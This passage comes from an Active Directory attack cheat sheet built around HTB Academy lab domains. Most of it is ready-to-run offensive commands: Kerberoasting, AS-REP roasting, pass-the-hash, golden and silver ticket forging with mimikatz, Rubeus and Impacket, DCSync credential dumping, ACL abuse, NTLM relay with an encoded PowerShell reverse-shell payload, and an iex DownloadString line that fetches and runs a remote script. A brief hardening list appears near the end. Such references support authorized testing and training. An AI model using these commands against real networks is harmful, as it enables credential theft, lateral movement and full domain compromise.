.\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

**Kerberoasting**

```cmd
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
.\Rubeus.exe kerberoast /outfile:<FILE>
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```

#### Overpass The Hash/Pass The Key (PTK)

#### Request TGT with Hash

```shell
impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
```

#### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)

```shell
impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
```

#### Request TGT with Password

#### Set TGT for Impacket Usage

#### Execute Remote Commands

```shell
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

#### Ask and inject the Ticket

```cmd
.\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
```

#### Execute a CMD on Remote Host

```cmd
.\PsExec.exe -accepteula \\<RHOST> cmd
```

#### Pass The Ticket (PTT)

#### Harvest Tickets from Linux

#### Check Type and Location of Tickets

```shell
grep default_ccache_name /etc/krb5.conf
```

* If none return, default is FILE:/tmp/krb5cc_%{uid}
* In Case of File Tickets it is possible to Copy-Paste them to use them
* In Case of being KEYRING Tickets, the Tool tickey can be used to get them
* To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
* To inject, the Ticket have to be copied in a reachable Folder by all Users

```shell
cp tickey /tmp/tickey
/tmp/tickey -i
```

#### Harvest Tickets from Windows

```cmd
.\Rubeus dump
```

#### Convert Tickets dumped with Rubeus into base64

```cmd
[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
```

#### Convert Tickets between Linux and Windows Format with ticket_converter.py

> https://github.com/Zer1t0/ticket_converter

```shell
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

#### Using Ticket on Linux

#### Execute Remote Commands by using TGT

#### Using Ticket on Windows

#### Inject Ticket with mimikatz

```cmd
kerberos::ptt <KIRBI_FILE>
```

#### Inject Ticket with Rubeus

```cmd
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

**Execute a CMD on Remote Host**

**Silver Ticket**

#### Impacket Examples

#### Generate TGS with NTLM

```shell
python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

#### Generate TGS with aesKey

```shell
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

#### Set the ticket for impacket use

**Execute Remote Commands by using TGT**

#### mimikatz Examples

**Generate TGS with NTLM**

```cmd
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

#### Generate TGS with AES 128bit Key

```cmd
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

#### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```cmd
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

#### Inject TGS with Mimikatz

#### Rubeus Examples

#### Execute CMD on Remote Host

**Golden Ticket**

**Impacket Examples**

#### Generate TGT with NTLM

```shell
python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

#### Generate TGT with aesKey

```shell
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

**Set TGT for Impacket Usage**

**Execute Remote Commands by using TGT**

**mimikatz Examples**

**Generate TGT with NTLM**

```cmd
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
```

#### Generate TGT with AES 128bit Key

```cmd
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
```

#### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```cmd
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
```

#### Inject TGT with Mimikatz

**Rubeus Examples**

**Inject Ticket with Rubeus**

**Execute CMD on Remote Host**

#### Get NTLM from Password

```shell
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
```

### ACL Enumeration & Abuse

```
# PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
Find-InterestingDomainAcl

# Used to import PowerView and retrieve the SID of a specific user account (wley) from a Windows-based host.
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley

# Using Get-DomainObjectACL
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# Performing a Reverse Search & Mapping to a GUID Value
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
# Using the -ResolveGUIDs Flag
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# Creating a List of Domain Users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
# Loop over each user
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
# Further Enumeration of Rights Using damundsen
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
Get-DomainObjectACL -Identity "GPO Management GroupMembers" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
# Investigating the Help Desk Level 1 Group with Get-DomainGroup
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
# Investigating the Information Technology Group
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
# Looking for Interesting Access
$adunnsid = Convert-NameToSid adunn
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

# Used to create a PSCredential Object from a Windows-based host.
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Creating a SecureString Object
$damundsenPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force

# PowerView tool used to change the password of a specific user (damundsen) on a target Windows domain from a Windows-based host.
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

$SecPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# PowerView tool used to add a specific user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# PowerView tool used to create a fake Service Principal Name given a specific user (adunn) from a Windows-based host.
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
# Kerberoasting with Rubeus
.\Rubeus.exe kerberoast /user:adunn /nowrap

# remove and clean up
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

### DCSync

```
# PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

# Uses Mimikatz to perform a dcsync attack from a Windows-based host.
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

# Uses the PowerShell cmdlet Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

```

### Miscellaneous Misconfigurations

```
# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser * | Select-Object samaccountname,description

# PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### AS-REP Roasting

```
# PowerView based tool used to search for the DONT_REQ_PREAUTH value across user accounts in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Uses Rubeus to perform an AS-REP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

# Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Child → Parent Trusts (ExtraSids)

#### Enumeration

```powershell
Import-Module ActiveDirectory
Get-ADTrust -Filter *
Get-DomainTrust
Get-DomainTrustMapping
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

```cmd
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation
```

```
- MS14-068
- GetUserSPNs
GET USERS:

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" IP
use auxiliary/gather/kerberos_enumusers

https://www.tarlogic.com/blog/como-funciona-kerberos/
https://www.tarlogic.com/blog/como-atacar-kerberos/

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt

https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
```

```
ldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"
ldapsearch -x -h 10.11.1.111 -D 'DOMAIN\user' -w '<PASSWORD>'
ldapdomaindump 10.11.1.111 -u 'DOMAIN\user' -p 'hash-password'
patator ldap_login host=10.10.1.111 1=/root/Downloads/passwords_ssh.txt user=hsmith password=<PASSWORD> -x ignore:mesg='Authentication failed.'
```

#### ExtraSids — Mimikatz

Requirements:

- KRBTGT hash of the child domain
- SID of the child domain
- Name of a target user in the child domain (the account does not need to exist)
- FQDN of the child domain
- SID of the root domain's Enterprise Admins group

```powershell
# KRBTGT hash
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# Child domain SID
Get-DomainSID

# Enterprise Admins SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Confirm no access
ls \\academy-ea-dc01.inlanefreight.local\c$

# Golden ticket
mimikatz.exe
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<ENTERPRISE_ADMINS_SID> /ptt
klist
ls \\academy-ea-dc01.inlanefreight.local\c$
```

#### ExtraSids — Rubeus

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /user:hacker /ptt
klist
```

**Common Commands**

```cmd
.\Rubeus.exe dump /nowrap
.\Rubeus.exe asreproast /outfile:hashes.asreproast
.\Rubeus.exe kerberoast /nowrap
```

##### Request a Delegation Ticket

```cmd
.\Rubeus.exe tgtdeleg /nowrap
```

**Overpass the Hash**

```cmd
.\Rubeus.exe kerberoast /user:<USERNAME>
```

##### Pass the Hash

```cmd
.\Rubeus.exe asktgt /<USERNAME>:<PASSWORD> /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
```

#### DCSync from the Child Domain

```powershell
.\mimikatz.exe
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

#### From Linux (Impacket)

```bash
# KRBTGT hash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# Domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# Golden ticket
ticketer.py -nthash <KRBTGT_HASH> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <CHILD_DOMAIN_SID> -extra-sid <ENTERPRISE_ADMINS_SID> hacker
export KRB5CCNAME=hacker.ccache

# SYSTEM shell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/<EMAIL> -k -no-pass -target-ip 172.16.5.5

# Automated
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

##### impacket-addcomputer

```shell
impacket-addcomputer -dc-ip <RHOST> -computer-name <MACHINE_ACCOUNT> -computer-pass <PASSWORD> <DOMAIN>/<USERNAME>:<PASSWORD>$ impacket-addcomputer -dc-ip <RHOST> -computer-name <MACHINE_ACCOUNT> -computer-pass <PASSWORD> <DOMAIN>/<USERNAME>:<PASSWORD>
```

##### impacket-atexec

```shell
impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
```

##### impacket-changepasswd

```shell
impacket-changepasswd <DOMAIN>/<USERNAME>@<RHOST> -reset -altuser <USERNAME> -althash :<HASH>
```

##### impacket-dcomexec

```shell
impacket-dcomexec <RHOST> -object MMC20 -silentcommand -debug <DOMAIN>/<USERNAME>:<PASSWORD> <COMMAND>
impacket-dcomexec -dc-ip <RHOST> -object MMC20 -slientcommand <DOMAIN>/<USERNAME>@<RHOST> <COMMAND>
```

##### impacket-describeTicket

```shell
impacket-describeTicket <FILE>.ccache
```

##### impacket-findDelegation

```shell
impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>
```

##### impacket-GetADUsers

```shell
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
```

##### impacket-GetNPUsers

```shell
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
```

##### impacket-getST

```shell
impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
impacket-getST <DOMAIN>/<USERNAME>$ -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
impacket-getST -k -no-pass -spn 'krbtgt/<DOMAIN>' -dc-ip <RHOST> <DOMAIN>/<USERNAME>
```

##### impacket-getTGT

```shell
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes <NTLM_HASH>
impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY> -dc-ip <RHOST>
```

##### impacket-getUserSPNs

```shell
impacket-GetUserSPNs <DOMAIN>/<USERNAME> -dc-ip <RHOST> -request
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request
```

```shell
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
```

##### impacket-lookupsid

```shell
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

##### impacket-netview

```shell
impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
```

##### impacket-ntlmrelayx

##### Common Commands

```shell
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --interactive
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --remove-mic -i
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --remove-mic --interactive
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --escalate-user '<USERNAME>'
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --escalate-user '<USERNAME>' --remove-mic
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --no-dump --add-dns-record 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' '<LHOST>'
impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
impacket-ntlmrelayx -t <LHOST> --no-http-server -smb2support -c "powershell -enc JAB<--- SNIP --->j=="
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --no-dump --no-da --no-acl
```

**Execution**

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST>
```

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST> METHOD=petitpotam
```

##### Connect to LDAP Shell

```shell
nc 127.0.0.1 11000
```

**LDAP Shell**

##### Resource-Based Constrained Delegtion (RBCD)

```shell
set_rbcd <RHOST>$ <RHOST>$
```

```shell
impacket-getST -spn 'cifs/<RHOST>.<DOMAIN>' -impersonate Administrator -hashes
```

```shell
netexec smb <RHOST>.<DOMAIN> -u '<RHOST>$' -H <HASH> --delegate Administrator --self
```

##### Shadow Credentials

```shell
clear_shadow_creds <RHOST>$
set_shadow_creds <RHOST>$
```

##### Reverse Shell Example

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JAB<--- SNIP --->j=="
```

```cmd
dir \\<LHOST>\foobar
```

```shell
nc -lnvp <LPORT>
```

##### impacket-psexec

```shell
impacket-psexec <USERNAME>@<RHOST>
impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes <NTLM_HASH>
```

##### impacket-req

```shell
impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <COMMAND> <COMMAND>
```

##### impacket-rpcdump

```shell
impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

##### impacket-samrdump

```shell
impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

##### impacket-secretsdump

```shell
impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
impacket-secretsdump -dc-ip <RHOST> <DOMAIN>/<SUERNAME>:<PASSWORD>@<RHOST>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
```

```shell
impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
```

##### impacket-services

```shell
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
```

##### impacket-smbclient

```shell
impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

```shell
impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
```

##### impacket-smbpasswd

```shell
impacket-smbpasswd <RHOST>/<USERNAME>:<PASSWORD>@<RHOST> -newpass <PASSWORD>
```

##### impacket-smbserver

```shell
impacket-smbserver share . -smb2support
impacket-smbserver -smb2support share <FOLDER> -user <USERNAME> -password <PASSWORD>
```

##### impacket-ticketer

##### Requirements

* Valid User
* NTHASH
* Domain-SID

```shell
impacket-ticketer -nthash <NTLM_HASH> -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
impacket-ticketer -nthash <NTLM_HASH> -domain-sid S-1-5-21-2847563149-1937258901-3562441728 -domain <NTLM_HASH> -spn MSSQLSVC/<RHOST> -groups 512,519,1105 -user-id 1103 mssqlsvc
```

**Error Handling**

##### Fixing [-] exceptions must derive from BaseException

##### Error Message

```shell
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST> -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

##### Fix

```shell
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```

##### dacledit.py

> https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py

```shell
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'write' -rights 'FullControl' -principal '<USERNAME>' -target-dn 'CN=<GROUP{>,CN=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <RHOST>
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -use-ldaps -dc-ip <RHOST>
```

**Error Handling**

##### Fixing msada_guids Error

```shell
#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```

Then put the `msada_guids.py` into the same directory as `dacledit.py`

> https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py

##### owneredit.py

> https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py

```shell
python3 owneredit.py -k <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -action write -new-owner <USERNAME> -target <GROUP> -debug
```

##### ThePorgs Fork

```shell
pipenv shell
git clone https://github.com/ThePorgs/impacket/
pip install -r requirements.txt
sudo python3 setup.py install
```

### Cross-Forest Trusts

#### From Windows

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# Kerberoast across the trust
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

# Foreign group membership
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName <ROOT_DOMAIN_ADMIN_SID>

# Remote session
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

#### From Linux

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Point DNS at the target domain before enumerating:

```bash
# Add INLANEFREIGHT.LOCAL to /etc/resolv.conf
cat /etc/resolv.conf
#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5

bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p '<PASSWORD>'
zip -r ilfreight_bh.zip *.json

# Add FREIGHTLOGISTICS.LOCAL to /etc/resolv.conf
cat /etc/resolv.conf
#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238

bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u <EMAIL> -p '<PASSWORD>'
```

### AD Tooling, External Recon & Advanced Attacks

Tooling:

- **BloodHound/SharpHound** — graph relationships, ACLs, sessions.
- **PowerView** — domain enumeration and ACL abuse.
- **Rubeus** — Kerberos tickets, Kerberoasting, AS-REP, PtT.
- **Impacket** — `GetUserSPNs.py`, `secretsdump.py`, `psexec.py`, `wmiexec.py`, `ticketer.py`.
- **Windapsearch / ldapsearch** — LDAP enumeration.
- **Snaffler** — find credentials and sensitive files on shares.
- **AD Explorer / ADSI Edit** — GUI inspection.

External recon:

```bash
dig any <DOMAIN>
dig axfr <DOMAIN> @<NAMESERVER>
nmap -sV -sC -p 53,80,443,389,636,88,445,3389 <TARGET>
ldapsearch -H ldap://<TARGET> -x -s base -b "" namingContexts
```

Look for exposed VPN, OWA, AD FS, and LDAP services. Enumerate usernames via DNS, email formats, and public data before spraying.

Privileged access and the Kerberos double-hop problem:

```powershell
Enter-PSSession -ComputerName <HOST> -Credential $cred
Invoke-Command -ComputerName <HOST> -Credential $cred -ScriptBlock { whoami }
klist
```

- The double-hop problem occurs when a second network hop cannot reuse the user's credentials.
- Options: CredSSP, constrained delegation, `PSSessionConfiguration`, or Kerberos delegation.
- Check unconstrained delegation and `TrustedForDelegation` accounts.

Bleeding-edge vulnerabilities to check:

- **Zerologon** (CVE-2020-1472) — Netlogon cryptographic bypass.
- **PrintNightmare** (CVE-2021-1675 / CVE-2021-34527) — print spooler RCE/LPE.
- **PetitPotam** — coercion to relay NTLM to AD CS or SMB.
- **noPac** (CVE-2021-42278 / CVE-2021-42287) — sAMAccountName spoofing to Domain Admin.
- **AD CS ESC1-ESC8** — certificate template abuse.

Check patch levels and only run a PoC that matches the target. These attacks can be disruptive.

AD hardening and auditing:

- Tiered administration; separate DA, server, and workstation admins.
- LAPS for local admin passwords; disable inactive accounts.
- Disable LLMNR/NBT-NS and mDNS where possible.
- Restrict Kerberos delegation and unconstrained delegation.
- Enforce LDAP signing/channel binding; protect AD CS templates.
- Patch DCs and monitor replication, DCSync, and privilege changes.
- Audit ACLs, SPNs, password policy, and privileged group membership.

#### Domain & External Enumeration Commands

```bash
# DNS and public exposure
nslookup ns1.<DOMAIN>
dig any <DOMAIN>

# Breach/OSINT lookup (authorized engagements only)
sudo python3 dehashed.py -q <DOMAIN> -p

# Kerbrute build and username enumeration
sudo git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make help
sudo make all
ls dist/
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid_ad_users
```

#### Privileged Access & Lateral Movement

```powershell
# Who can log on where
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Management Users"

# PSSession with explicit credentials
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
Enter-PSSession -ComputerName <HOST> -Credential $cred
```

```bash
# WinRM
gem install evil-winrm
evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'
```

```powershell
# MSSQL discovery and querying
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
